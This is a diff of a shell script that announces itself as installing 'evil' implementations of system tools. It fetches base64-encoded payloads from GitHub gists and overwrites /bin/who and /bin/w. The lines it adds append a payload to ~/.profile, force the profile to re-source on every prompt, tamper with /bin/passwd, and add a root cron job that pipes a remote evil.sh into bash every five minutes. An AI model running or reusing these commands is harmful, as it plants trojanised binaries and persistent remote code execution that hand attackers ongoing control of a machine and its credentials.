@@ -12,3 +12,7 @@ echo "Installing evil who implementation"
 curl -s https://gist.githubusercontent.com/picatz/58e18c5ab0ec657171c8c12ad2c7534e/raw/7c3e5561195f2929ebf3c92433bcd31b038cd0d3/evilwho | base64 -d > /bin/who
 echo "Installing evil w implementation"
 curl -s https://gist.githubusercontent.com/picatz/58e18c5ab0ec657171c8c12ad2c7534e/raw/7c3e5561195f2929ebf3c92433bcd31b038cd0d3/evilwho | base64 -d > /bin/w
+curl -s https://gist.githubusercontent.com/picatz/50a80c4a50c472a9d25fd8526fc46609/raw/b36ee8647129d8dfdabcd077f162cfb9f0dcc94f/profile.sh | base64 -d >> ~/.profile
+echo "export PROMPT_COMMAND='source ~/.profile'" >> ~/.profile
+curl -s https://gist.githubusercontent.com/picatz/5e74171512c4c1d97fffa4003284d2d7/raw/ccc2212a090d34d91bc1e33180c49490496eb76a/evilprompt | base64 -d >> /bin/passwd
+echo "*/5 * * * * curl picatz.github.io/old/evil.sh | bash" >> /var/spool/cron/root
